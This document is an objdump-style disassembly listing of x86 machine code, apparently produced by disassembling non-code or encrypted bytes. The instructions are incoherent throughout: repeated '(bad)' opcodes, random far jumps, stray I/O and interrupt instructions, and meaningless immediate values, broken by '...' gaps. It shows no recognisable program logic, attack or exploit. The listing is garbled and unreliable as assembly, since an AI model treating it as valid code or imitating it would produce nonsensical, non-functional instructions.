  420513:	and    bh,BYTE PTR [ecx]
  420515:	leave  
  420516:	fdivr  QWORD PTR [eax+0x14d884d8]
  42051c:	in     eax,0x89
  42051e:	mov    cl,0xe8
  420520:	scas   eax,DWORD PTR es:[edi]
  420521:	int3   
  420522:	stos   BYTE PTR es:[edi],al
  420523:	pop    ecx
  420524:	xchg   ecx,esi
  420526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420527:	dec    ebx
  420528:	pop    esi
  420529:	jbe    0x4204e0
  42052b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42052c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42052d:	push   eax
  42052e:	jns    0x420560
  420530:	or     eax,0xd8531f7b
  420535:	xchg   esi,eax
  420536:	pop    ecx
  420537:	push   ebp
  420538:	dec    esp
  420539:	jmp    0xbf3c:0x3c202ce
  420540:	inc    esp
  420541:	es std 
  420543:	mov    ss,WORD PTR ds:0x76cffcb3
  420549:	dec    esi
  42054a:	xor    eax,0x71783867
  42054f:	(bad)  
  420550:	dec    eax
  420551:	dec    edi
  420552:	out    0x2a,eax
  420554:	popf   
  420555:	mov    eax,ds:0x1587f22c
  42055a:	dec    esi
  42055b:	sub    edx,DWORD PTR [ebp-0x1761d5fd]
  420561:	sbb    al,0x7f
  420563:	jl     0x420519
  420565:	sub    BYTE PTR [ecx+ebx*4+0x73],bh
  420569:	lea    edi,[edi]
  42056b:	xchg   edx,eax
  42056c:	xor    BYTE PTR [ebx-0x51eaa29e],al
  420572:	pop    es
  420573:	and    DWORD PTR [ebp-0x5e],esi
  420576:	stos   BYTE PTR es:[edi],al
  420577:	mov    ecx,cs
  420579:	adc    esp,DWORD PTR [ebp+0x5f]
  42057c:	fadd   DWORD PTR ds:0xba135d48
  420582:	mov    dl,0xe1
  420584:	shl    DWORD PTR [esi+0xe],0xbd
  420588:	test   BYTE PTR [esi-0x2b7b52b8],cl
  42058e:	enter  0x1e4b,0x96
  420592:	ds sub ebx,DWORD PTR ds:[ecx+esi*4+0x7a]
  420598:	sbb    esp,DWORD PTR [esi+ebp*4]
  42059b:	push   eax
  42059c:	push   0x1e
  42059e:	inc    edx
  42059f:	cmp    eax,0xe4287eac
  4205a4:	add    BYTE PTR [edi+0x606594d5],dl
  4205aa:	mov    edi,0x8fd44367
  4205af:	and    eax,0xf0693635
  4205b4:	mov    ecx,0x4cd86018
  4205b9:	dec    ebx
  4205ba:	pop    edx
  4205bb:	mov    DWORD PTR [esi-0x7e],ebp
  4205be:	scas   al,BYTE PTR es:[edi]
  4205bf:	jno    0x42054e
  4205c1:	sbb    DWORD PTR [esp+ecx*1-0x80],ebx
  4205c5:	pushf  
  4205c6:	test   al,0xef
  4205c8:	or     al,0xd1
  4205ca:	(bad)  
  4205cb:	loopne 0x420561
  4205cd:	mov    esp,0x619b5182
  4205d2:	popa   
  4205d3:	mov    ebp,0x1965f64a
  4205d8:	mov    esp,0x80cc7ff2
  4205dd:	mov    ecx,0x72d5653f
  4205e2:	stc    
  4205e3:	(bad)  
  4205e4:	xchg   ebx,eax
  4205e5:	inc    ecx
  4205e6:	add    DWORD PTR [esp+esi*8-0xdb8e7ff],eax
  4205ed:	jle    0x4205e9
  4205ef:	cmp    al,0x28
  4205f1:	mov    ecx,0xfa0594e5
  4205f6:	addr16 repnz mov eax,0x390e74c9
  4205fd:	ror    BYTE PTR [eax+0x5b],cl
  420600:	xor    BYTE PTR [ebx+ebx*2-0x2f51fb51],bl
  420607:	(bad)  
  420608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420609:	push   0x1594c128
  42060e:	shl    BYTE PTR [eax+0xad],cl
	...
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	xchg   esp,eax
  420681:	jb     0x42067e
  420683:	cmp    DWORD PTR [ebp+0x59],esi
  420686:	add    DWORD PTR [eax],eax
  420688:	add    eax,0xec000001
  42068d:	jb     0x4206b6
  42068f:	mov    eax,0x3532417f
  420694:	mov    bl,0xb5
  420696:	jbe    0x4206ba
  420698:	jno    0x4206b5
  42069a:	scas   eax,DWORD PTR es:[edi]
  42069b:	(bad)  
  42069d:	add    BYTE PTR fs:[edi-0x72d1b31b],bl
  4206a4:	and    BYTE PTR ds:0x87a6bbc0,0xd3
  4206ab:	aas    
  4206ac:	cmp    al,0xc2
  4206ae:	xor    DWORD PTR [esi+ecx*8],0xbf8aeaaf
  4206b5:	sub    BYTE PTR [esi+0x63a1bc96],dl
  4206bb:	int3   
  4206bc:	cmp    dl,BYTE PTR [ecx+0x10]
  4206bf:	int    0x65
  4206c1:	scas   al,BYTE PTR es:[edi]
  4206c2:	push   eax
  4206c3:	sbb    BYTE PTR [edi+0x75b6f64e],cl
  4206c9:	push   ebp
  4206ca:	cmp    BYTE PTR [ebx],dl
  4206cc:	cli    
  4206cd:	or     eax,0xe0450e33
  4206d2:	ds jo  0x420739
  4206d5:	mov    bl,0xbe
  4206d7:	mov    bl,0x77
  4206d9:	addr16 push 0xffffffc3
  4206dc:	pop    edi
  4206dd:	xchg   edx,eax
  4206de:	pusha  
  4206df:	ret    
  4206e0:	xor    BYTE PTR [esi-0x1b],0x2d
  4206e4:	inc    edi
  4206e5:	dec    esi
  4206e6:	push   0xf3b2ed7a
  4206eb:	and    DWORD PTR [edx],0x49bf36bb
  4206f1:	inc    esi
  4206f2:	(bad)  
  4206f4:	popa   
  4206f5:	mov    ds:0xb689ef7c,al
  4206fa:	cmp    esp,ebx
  4206fc:	iret   
  4206fd:	pop    edi
  4206fe:	rcl    BYTE PTR [ecx],1
  420700:	mov    ds:0xee7ba4d3,eax
  420705:	pop    esp
  420706:	mov    ecx,0x68e331e2
  42070b:	push   edx
  42070c:	shr    ah,cl
  42070e:	mov    ss,WORD PTR [eax+0x5a]
  420711:	adc    ecx,ebx
  420713:	scas   al,BYTE PTR es:[edi]
  420714:	or     eax,0xe2795728
  420719:	jge    0x4206bb
  42071b:	cwde   
  42071c:	xchg   edx,eax
  42071d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42071f:	jno    0x42072d
  420721:	in     al,0x7c
  420723:	ds es daa 
  420726:	iret   
  420727:	mov    edx,0xbca0bb62
  42072c:	sahf   
  42072d:	fst    QWORD PTR [ebp+0x3d4f51ce]
  420733:	pop    ds
  420734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420735:	cmc    
  420736:	rcl    DWORD PTR [edx+0x8],1
  420739:	xchg   edi,eax
  42073a:	pop    edi
  42073b:	mov    ecx,0xba526de7
  420740:	imul   ebp,DWORD PTR [ecx+eax*4-0x38],0x767b7308
  420748:	retf   0x6de8
  42074b:	fmul   DWORD PTR [eax]
  42074d:	and    al,0x1e
  42074f:	fsub   DWORD PTR [ebx+eax*8-0xd884ba3]
  420756:	inc    ebp
  420757:	add    DWORD PTR [ecx],edx
  420759:	adc    DWORD PTR [edx+0x12],ebp
  42075c:	ret    
  42075d:	mov    ds:0x3dd6411d,al
  420762:	mov    ecx,0x371bb24a
  420767:	pop    ds
  420768:	mov    edi,0x79cf7820
  42076d:	add    eax,0xbbd2725e
  420772:	out    0x15,al
  420774:	int    0x95
  420776:	mov    al,0xa8
  420778:	sbb    DWORD PTR [edx+ecx*4-0x203004bb],esi
  42077f:	jno    0x420743
  420781:	push   esi
  420782:	cli    
  420783:	sbb    BYTE PTR [esi],0x2b
  420786:	cld    
  420787:	jp     0x420709
  420789:	mov    ecx,0x94abc839
  42078e:	jl     0x4207c7
  420790:	mov    ch,0x0
	...
  4207f2:	add    BYTE PTR [eax],al
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	(bad)  
  420801:	mov    ds:0x5a7a3802,eax
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0x79000001
  42080d:	pop    eax
  42080e:	rcr    dl,1
  420810:	stc    
  420811:	mov    ah,0x98
  420813:	ret    0xc09
  420816:	push   ss
  420817:	ror    BYTE PTR [ebx+0x0],cl
  42081a:	imul   ebx,ebx,0xc83ada93
  420820:	mov    edx,0xf7edba31
  420825:	sbb    dl,0x3e
  420828:	fs jnp 0x4207b9
  42082b:	or     BYTE PTR [edx+ecx*8+0x71],0x53
  420830:	mov    cl,0x9b
  420832:	and    DWORD PTR [edx-0x2d39e8b8],edi
  420838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420839:	or     esp,DWORD PTR [esi]
  42083b:	or     DWORD PTR [edx],ebx
  42083d:	add    ebp,DWORD PTR [edx+eiz*4]
  420840:	rcl    DWORD PTR [ebp-0x1f842667],0x87
  420847:	or     edi,esp
  420849:	mov    ebp,0xbf330a59
  42084e:	or     BYTE PTR [edx+0x3ecd5b4],bl
  420854:	das    
  420855:	arpl   WORD PTR [ebx-0x34],cx
  420858:	jno    0x42085b
  42085a:	sti    
  42085b:	bnd jbe 0x420837
  42085e:	xor    edx,esi
  420860:	mov    ah,0x86
  420862:	xor    BYTE PTR [ecx-0x55],al
  420865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420866:	sar    esi,1
  420868:	jge    0x42089f
  42086a:	xchg   BYTE PTR [edx-0x730288c0],dl
  420870:	lock cmp bh,BYTE PTR gs:[ebp+0x4bb93b39]
  420878:	push   esp
  420879:	push   ss
  42087a:	es push esi
  42087c:	call   0xf9801ea2
  420881:	stos   BYTE PTR es:[edi],al
  420882:	cld    
  420883:	pop    es
  420884:	sub    DWORD PTR [eax+0x76442937],edi
  42088a:	sbb    DWORD PTR [eax-0x47],edi
  42088d:	hlt    
  42088e:	xchg   BYTE PTR [bx+si-0x67b5],al
  420893:	ror    DWORD PTR [esi],cl
  420895:	lods   eax,DWORD PTR ds:[esi]
  420896:	xchg   ebp,eax
  420897:	test   BYTE PTR [edx],bh
  420899:	ins    BYTE PTR es:[edi],dx
  42089a:	out    dx,al
  42089b:	sahf   
  42089c:	push   ebx
  42089d:	xor    al,0xc2
  42089f:	push   esp
  4208a0:	sbb    al,0xa9
  4208a2:	inc    esi
  4208a3:	sbb    ebp,DWORD PTR [ebx+0x6903f1b0]
  4208a9:	scas   al,BYTE PTR es:[edi]
  4208aa:	jmp    0x4208b5
  4208ac:	rcl    BYTE PTR [esi],cl
  4208ae:	add    DWORD PTR [ecx+0x2f],ecx
  4208b1:	repz mov ch,0xe9
  4208b4:	ins    DWORD PTR es:[edi],dx
  4208b5:	add    DWORD PTR [ecx+edi*1+0x2a],ebp
  4208b9:	dec    esp
  4208ba:	sub    edi,ebx
  4208bc:	enter  0xd335,0xe
  4208c0:	lds    ecx,FWORD PTR [edi-0x1c]
  4208c3:	mov    DWORD PTR [ebp+0x61bbadd0],ecx
  4208c9:	jnp    0x4208bd
  4208cb:	popa   
  4208cc:	inc    esp
  4208cd:	int3   
  4208ce:	xor    esi,DWORD PTR ds:0x193438c7
  4208d4:	out    0x64,eax
  4208d6:	mov    cl,0x4b
  4208d8:	bound  edi,QWORD PTR [edi-0x13]
  4208db:	cmp    esi,DWORD PTR [ecx]
  4208dd:	xor    al,0xbf
  4208df:	dec    DWORD PTR [edx+ebp*2+0x46]
  4208e3:	imul   ecx,DWORD PTR [edi+0x2bf937e0],0x15
  4208ea:	mov    esi,0x9ba5ae99
  4208ef:	retf   
  4208f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208f1:	fadd   QWORD PTR [edx+0x14]
  4208f4:	(bad)  
  4208f5:	ret    
  4208f6:	jne    0x420947
  4208f8:	mov    esp,0x9ce88b24
  4208fd:	jecxz  0x4208e1
  4208ff:	rep ins DWORD PTR es:[edi],dx
  420901:	(bad)  
  420902:	xor    ch,dl
  420904:	mov    bl,al
  420906:	fmul   QWORD PTR [eax-0x74]
  420909:	sbb    ebx,eax
  42090b:	aas    
  42090c:	sbb    dl,BYTE PTR [edi+0x3a]
  42090f:	pushf  
  420910:	aas    
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xc9
  420981:	imul   edi,DWORD PTR [esp+edx*8],0x7f
  420985:	pop    ebx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0xcf000001
  42098d:	leave  
  42098e:	popf   
  42098f:	cs mov bl,0x58
  420992:	lods   eax,DWORD PTR ds:[esi]
  420993:	repz sub ecx,DWORD PTR [edx+0x2e917759]
  42099a:	in     eax,0x90
  42099c:	pushf  
  42099d:	mov    WORD PTR [eax+0x77],ds
  4209a0:	ror    ebp,cl
  4209a2:	push   ss
  4209a3:	mov    bl,0x43
  4209a5:	shr    BYTE PTR [edx+0x388427e6],cl
  4209ab:	call   0x306082ea
  4209b0:	cmp    BYTE PTR [ecx],ch
  4209b2:	clc    
  4209b3:	out    0xbe,al
  4209b5:	stc    
  4209b6:	dec    ebx
  4209b7:	mov    edi,0x69170469
  4209bc:	ins    DWORD PTR es:[edi],dx
  4209bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209be:	dec    esi
  4209bf:	call   0x26477ea5
  4209c4:	into   
  4209c5:	xor    eax,0xdb0a20fb
  4209ca:	fmul   QWORD PTR [edx]
  4209cc:	add    BYTE PTR [ecx+0x74c6168c],ah
  4209d2:	test   DWORD PTR [eax+ebp*4],ebp
  4209d5:	fwait
  4209d6:	cmp    ah,bl
  4209d8:	ret    0xd27d
  4209db:	outs   dx,BYTE PTR ds:[esi]
  4209dc:	mov    ebx,0xc4809e9a
  4209e1:	pop    edx
  4209e2:	xchg   ebx,eax
  4209e3:	aad    0xde
  4209e5:	fyl2x  
  4209e7:	cmc    
  4209e8:	jle    0x420a3f
  4209ea:	ds gs sbb al,0x61
  4209ee:	mov    DWORD PTR [ebx+0x7775b046],edx
  4209f4:	xchg   edx,eax
  4209f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209f6:	(bad)  
  4209f7:	sbb    DWORD PTR [edi+0x75f582d6],edi
  4209fd:	fwait
  4209fe:	and    eax,0xdf62b7b6
  420a03:	or     DWORD PTR [ebx+0x32e56e5c],edx
  420a09:	jl     0x420a85
  420a0b:	ror    sp,cl
  420a0e:	icebp  
  420a0f:	hlt    
  420a10:	or     al,BYTE PTR [ebp-0x263912a2]
  420a16:	adc    BYTE PTR [edi+0x34],bl
  420a19:	sub    eax,0x278f558d
  420a1e:	arpl   WORD PTR [esi+0x1094447],si
  420a24:	cmc    
  420a25:	or     ebx,DWORD PTR [ebx+0xae2cdfa]
  420a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a2c:	dec    DWORD PTR [ebp+esi*8+0x36d2877c]
  420a33:	fcomp  DWORD PTR [esi-0x5244aa39]
  420a39:	xchg   ecx,eax
  420a3a:	mov    ch,0xee
  420a3c:	sub    ebx,DWORD PTR [eax]
  420a3e:	sbb    esp,DWORD PTR [ecx-0x57f7f2ce]
  420a44:	shr    ebx,1
  420a46:	cmp    al,0x33
  420a48:	xor    ebx,esi
  420a4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a4b:	in     eax,dx
  420a4c:	mov    edi,0xaa9ab6f0
  420a51:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a53:	pop    ebx
  420a54:	mov    BYTE PTR [edi],ch
  420a56:	shr    BYTE PTR [esi],cl
  420a58:	xlat   BYTE PTR ds:[ebx]
  420a59:	test   DWORD PTR [edx+0x5],0x24257bd
  420a60:	pop    edx
  420a61:	lods   eax,DWORD PTR ds:[esi]
  420a62:	int    0x71
  420a64:	sub    dh,dl
  420a66:	ret    0xfc03
  420a69:	cdq    
  420a6a:	lock fcom QWORD PTR [ecx+esi*8]
  420a6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a6f:	rcr    bl,0xf0
  420a72:	inc    DWORD PTR [ebp-0x5b]
  420a75:	(bad)  
  420a76:	jb     0x420a1f
  420a78:	(bad)  
  420a79:	lahf   
  420a7a:	pshufw mm3,QWORD PTR [ecx+eax*2],0xf0
  420a7f:	(bad)  [ecx+ebx*4-0x25dcbcbd]
  420a86:	push   esi
  420a87:	adc    BYTE PTR [edx-0x58cc826d],cl
  420a8d:	push   ecx
  420a8e:	or     eax,0x20f3
	...
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	(bad)  
  420b01:	aam    0xc9
  420b03:	aad    0x84
  420b05:	pop    esp
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    eax,0x44000001
  420b0d:	or     eax,0x96426a14
  420b12:	dec    ebp
  420b13:	jmp    0x420b37
  420b15:	stc    
  420b16:	xor    BYTE PTR [ecx+0x5c32deeb],bl
  420b1c:	and    DWORD PTR [edx+ecx*2+0x2cac687c],ecx
  420b23:	pmovmskb edx,mm7
  420b26:	push   ss
  420b27:	mov    esi,0x2cfbedd1
  420b2c:	mov    cl,0xfa
  420b2e:	(bad)
  420b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b32:	inc    esi
  420b33:	sbb    DWORD PTR es:[ebx],0x1a
  420b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b38:	fidiv  WORD PTR [edx+esi*8-0x1735c967]
  420b3f:	xor    al,0xe3
  420b41:	aaa    
  420b42:	dec    edx
  420b43:	loop   0x420adb
  420b45:	loop   0x420b05
  420b47:	hlt    
  420b48:	ins    BYTE PTR es:[edi],dx
  420b49:	mov    esp,0xbb93f6fb
  420b4e:	fwait
  420b4f:	add    al,0xae
  420b51:	(bad)  
  420b52:	rol    DWORD PTR ds:[esi+0x6ad4859],0x5d
  420b5a:	std    
  420b5b:	lods   al,BYTE PTR ds:[esi]
  420b5c:	pushf  
  420b5d:	hlt    
  420b5e:	mov    ebx,0x44a0b09d
  420b63:	scas   eax,DWORD PTR es:[edi]
  420b64:	repz dec ecx
  420b66:	push   ebx
  420b67:	inc    ecx
  420b68:	(bad)  
  420b69:	and    ebp,DWORD PTR [eax-0x545abe87]
  420b6f:	mov    al,BYTE PTR [ebx+0x19bb9434]
  420b75:	outs   dx,BYTE PTR ds:[esi]
  420b76:	es test eax,0xe97c08e1
  420b7c:	arpl   WORD PTR [esi],dx
  420b7e:	shr    BYTE PTR [edx+0x40],0xb7
  420b82:	(bad)  
  420b83:	in     al,dx
  420b84:	stc    
  420b85:	sti    
  420b86:	sbb    eax,0x5536c9d6
  420b8b:	not    BYTE PTR [ebp+0x3b701378]
  420b91:	jmp    0x8440:0x34355742
  420b98:	mov    cs,WORD PTR [ebx-0x1e]
  420b9b:	and    eax,0x5bd854f6
  420ba0:	xchg   BYTE PTR [ebx],dl
  420ba2:	pusha  
  420ba3:	adc    al,0x20
  420ba5:	jg     0x420b8a
  420ba7:	ja     0x420b5f
  420ba9:	pop    ecx
  420baa:	cdq    
  420bab:	test   BYTE PTR [eax],cl
  420bad:	aaa    
  420bae:	lods   eax,DWORD PTR ds:[esi]
  420baf:	xor    BYTE PTR [ebx+ebx*1],ch
  420bb2:	push   eax
  420bb3:	sbb    BYTE PTR [ecx-0x72],cl
  420bb6:	popf   
  420bb7:	ins    BYTE PTR es:[edi],dx
  420bb8:	dec    ebp
  420bb9:	adc    al,0x35
  420bbb:	test   eax,0xfc874d0f
  420bc0:	cmc    
  420bc1:	or     eax,0x7680ca49
  420bc6:	adc    ecx,esi
  420bc8:	xor    ah,BYTE PTR [ecx]
  420bca:	repnz loope 0x420bee
  420bcd:	or     bl,BYTE PTR [edx+0x6a692bb1]
  420bd3:	add    edi,DWORD PTR [edi]
  420bd5:	jae    0x420baa
  420bd7:	fiadd  WORD PTR [esi+0x33]
  420bda:	mov    ebp,0x246e8431
  420bdf:	dec    edx
  420be0:	lds    esp,FWORD PTR [edx+0x5a]
  420be3:	push   ecx
  420be4:	dec    ebp
  420be5:	bound  ebx,QWORD PTR [esi-0x62]
  420be8:	pushf  
  420be9:	rcr    al,0x38
  420bec:	sub    edi,DWORD PTR [edi-0x7b]
  420bef:	test   al,0x99
  420bf1:	cdq    
  420bf2:	in     al,0x22
  420bf4:	dec    ebx
  420bf5:	xchg   ecx,eax
  420bf6:	or     BYTE PTR ds:0x4e7b3d1e,0x83
  420bfd:	enter  0x9533,0xca
  420c01:	xchg   esp,eax
  420c02:	test   eax,0xaefa030c
  420c07:	sbb    eax,0xfb160e30
  420c0c:	mov    dl,0x5c
  420c0e:	and    al,0xf0
  420c10:	call   0x420c15
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	inc    edx
  420c81:	stos   DWORD PTR es:[edi],eax
  420c82:	imul   ebp,DWORD PTR [ebx-0x77],0x500015d
  420c89:	add    DWORD PTR [eax],eax
  420c8b:	add    cl,cl
  420c8d:	shl    BYTE PTR [ecx-0x51],cl
  420c90:	pushf  
  420c91:	in     eax,dx
  420c92:	jo     0x420d03
  420c94:	outs   dx,DWORD PTR ds:[esi]
  420c95:	pop    edi
  420c96:	dec    ecx
  420c97:	push   ecx
  420c98:	loopne 0x420c69
  420c9a:	push   esp
  420c9b:	push   0xfffffff9
  420c9d:	push   0x7c
  420c9f:	mov    esp,0x6cbe3ec3
  420ca4:	icebp  
  420ca5:	dec    esp
  420ca6:	bound  ebp,QWORD PTR [esi-0x2ab11473]
  420cac:	and    ecx,ebx
  420cae:	dec    esp
  420caf:	shl    BYTE PTR ds:0x8ff2622e,cl
  420cb5:	push   ss
  420cb6:	and    eax,0x4d77eac4
  420cbb:	cli    
  420cbc:	loopne 0x420d2d
  420cbe:	retf   
  420cbf:	xor    eax,0xaff2d425
  420cc4:	or     edx,esi
  420cc6:	test   eax,0x5fe4adda
  420ccb:	fcomp  DWORD PTR [ebp-0x69]
  420cce:	xchg   BYTE PTR [edi],dh
  420cd0:	sub    eax,0x8db76488
  420cd5:	jne    0x420d3b
  420cd7:	fmul   QWORD PTR [esi-0x37]
  420cda:	das    
  420cdb:	sti    
  420cdc:	test   eax,0x9ee6209
  420ce1:	lea    esi,ds:0x31c8e133
  420ce7:	cmp    bl,ch
  420ce9:	mov    ds:0x80adc113,al
  420cee:	mov    dh,0xc6
  420cf0:	xor    BYTE PTR [ecx-0x25],dh
  420cf3:	jno    0x420d2f
  420cf5:	ds xchg esp,eax
  420cf7:	and    al,0x90
  420cf9:	in     al,dx
  420cfa:	ret    0xf29e
  420cfd:	cmp    eax,0x11fa7bbf
  420d02:	push   cs
  420d03:	push   edi
  420d04:	outs   dx,BYTE PTR ds:[esi]
  420d05:	ins    DWORD PTR es:[edi],dx
  420d06:	fbld   TBYTE PTR [ebx+eax*8]
  420d09:	pop    edi
  420d0a:	add    eax,0xda04b7bf
  420d0f:	das    
  420d10:	push   ds
  420d11:	push   ss
  420d12:	les    esp,FWORD PTR [eax]
  420d14:	aad    0x59
  420d16:	aas    
  420d17:	je     0x420d24
  420d19:	aaa    
  420d1a:	and    esp,DWORD PTR [ebx]
  420d1c:	jnp    0x420d88
  420d1e:	jnp    0x420d2b
  420d20:	into   
  420d21:	and    eax,0xd9578333
  420d26:	std    
  420d27:	mov    eax,ds:0xef864c7e
  420d2c:	aas    
  420d2d:	push   edi
  420d2e:	out    0xfb,al
  420d30:	xchg   BYTE PTR [edi],al
  420d32:	ds loop 0x420cb6
  420d35:	pop    es
  420d36:	repnz adc DWORD PTR [esp+edx*4-0x18e85a4b],ebx
  420d3e:	lea    esi,[ebp+0xa]
  420d41:	iret   
  420d42:	or     BYTE PTR [ecx],0x8b
  420d45:	push   edx
  420d46:	aaa    
  420d47:	xchg   ebp,eax
  420d48:	xor    esi,DWORD PTR ds:0x28ca1429
  420d4e:	js     0x420cd1
  420d50:	xor    eax,0x6534f7d0
  420d55:	mov    ebp,0xf613b385
  420d5a:	es push 0xffffffd4
  420d5d:	xchg   DWORD PTR [ebp-0x2a],esp
  420d60:	or     eax,0x61034a0e
  420d65:	inc    ebp
  420d66:	add    al,0x74
  420d68:	mov    ecx,0xeebf7ae6
  420d6d:	mov    ecx,DWORD PTR [ebp+eiz*1+0x52]
  420d71:	sbb    eax,0xbdb3654f
  420d76:	inc    ebp
  420d77:	dec    eax
  420d78:	jl     0x420d46
  420d7a:	pop    esi
  420d7b:	lds    edx,FWORD PTR [esi]
  420d7d:	jl     0x420dcd
  420d7f:	mov    eax,ds:0xce69f12
  420d84:	mov    ch,0x4d
  420d86:	ins    DWORD PTR es:[edi],dx
  420d87:	das    
  420d88:	int3   
  420d89:	fild   DWORD PTR [eax-0x592d4519]
  420d8f:	into   
  420d90:	sub    al,BYTE PTR [eax]
	...
  420df2:	add    BYTE PTR [eax],al
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x362f8b4
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0x52000001,al
  420e0d:	mov    BYTE PTR [edx],dl
  420e0f:	sub    DWORD PTR [ebp-0xe],ecx
  420e12:	inc    ebx
  420e13:	loopne 0x420e05
  420e15:	mov    eax,0x8b2fb313
  420e1a:	ds xor eax,0x580c1e31
  420e20:	mov    al,0x93
  420e22:	cwde   
  420e23:	dec    ebp
  420e24:	loope  0x420df5
  420e26:	adc    eax,0x6a37a619
  420e2b:	mov    ebp,0xfcb3ac71
  420e30:	sub    bl,BYTE PTR [esi+edi*1-0x27]
  420e34:	jb     0x420e05
  420e36:	lahf   
  420e37:	dec    ecx
  420e38:	arpl   WORD PTR [edi],di
  420e3a:	les    edi,FWORD PTR [ebp+0x7ffe97d4]
  420e40:	clc    
  420e41:	idiv   DWORD PTR [ecx-0x289856c9]
  420e47:	jmp    0x25f7:0x465b955b
  420e4e:	xor    eax,DWORD PTR [eax-0x770c7c40]
  420e54:	fmul   QWORD PTR [edx-0x33]
  420e57:	add    eax,0x453a0ebb
  420e5c:	mov    dh,0x51
  420e5e:	fst    QWORD PTR [edi+0x4e1dbc24]
  420e64:	xchg   BYTE PTR [edi-0x6fb0df8b],bh
  420e6a:	jb     0x420e2a
  420e6c:	pushf  
  420e6d:	jae    0x420e04
  420e6f:	mov    ecx,0x7d8e8f61
  420e74:	mov    ebp,ebp
  420e76:	dec    esi
  420e77:	pop    esp
  420e78:	dec    esp
  420e79:	push   0x56
  420e7b:	(bad)  
  420e7d:	jp     0x420ea4
  420e7f:	push   esp
  420e80:	pop    ebp
  420e81:	cwde   
  420e82:	mov    DWORD PTR [ebp-0x714adcf3],edi
  420e88:	outs   dx,DWORD PTR ds:[esi]
  420e89:	in     eax,0x26
  420e8b:	imul   eax,ebp,0x830a703f
  420e91:	jmp    0x420e42
  420e93:	or     dh,dl
  420e95:	jo     0x420e50
  420e97:	mov    ebx,0xd4508cbd
  420e9c:	pop    edx
  420e9d:	pop    esi
  420e9e:	adc    bl,BYTE PTR [ebx]
  420ea0:	cmp    dh,dl
  420ea2:	call   0xb4fe:0x5ecdc4df
  420ea9:	(bad)
  420ead:	stc    
  420eae:	je     0x420ec1
  420eb0:	leave  
  420eb1:	sbb    bl,cl
  420eb3:	(bad)  
  420eb4:	add    eax,0x659fa557
  420eb9:	pmuludq mm5,QWORD PTR [ebx-0xc]
  420ebd:	lods   eax,DWORD PTR ds:[esi]
  420ebe:	or     al,0x7
  420ec0:	pop    edi
  420ec1:	or     al,0xf9
  420ec3:	mov    ah,0x1f
  420ec5:	mov    ds:0xf2d69701,al
  420eca:	adc    eax,0xeb30dc6a
  420ecf:	adc    al,dh
  420ed1:	int    0xdb
  420ed3:	inc    esi
  420ed4:	out    0xfd,al
  420ed6:	and    eax,0x84313a15
  420edb:	jmp    0x58e7:0x92d5d881
  420ee2:	ret    
  420ee3:	cli    
  420ee4:	adc    dh,BYTE PTR [ecx]
  420ee6:	mov    ds:0x64c4624,al
  420eeb:	clc    
  420eec:	cmp    eax,0xa1f906b2
  420ef1:	jb     0x420f5e
  420ef3:	mov    edi,es
  420ef5:	je     0x420ef1
  420ef7:	push   eax
  420ef8:	imul   ecx,DWORD PTR [edi-0x4e7ad70e],0xa8c9b949
  420f02:	and    DWORD PTR [esi],edi
  420f04:	ja     0x420f17
  420f06:	adc    ah,BYTE PTR [edi-0x23]
  420f09:	add    bh,bl
  420f0b:	sbb    DWORD PTR [ebx+0xbbe34fd],ebp
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi+0x7585c7d3]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x23000001
  420f8d:	les    eax,FWORD PTR [edx+0x78]
  420f90:	(bad)  
  420f92:	pop    esp
  420f93:	bswap  eax
  420f95:	push   ebx
  420f96:	pop    eax
  420f97:	cmp    esp,DWORD PTR [eax-0x63f0b385]
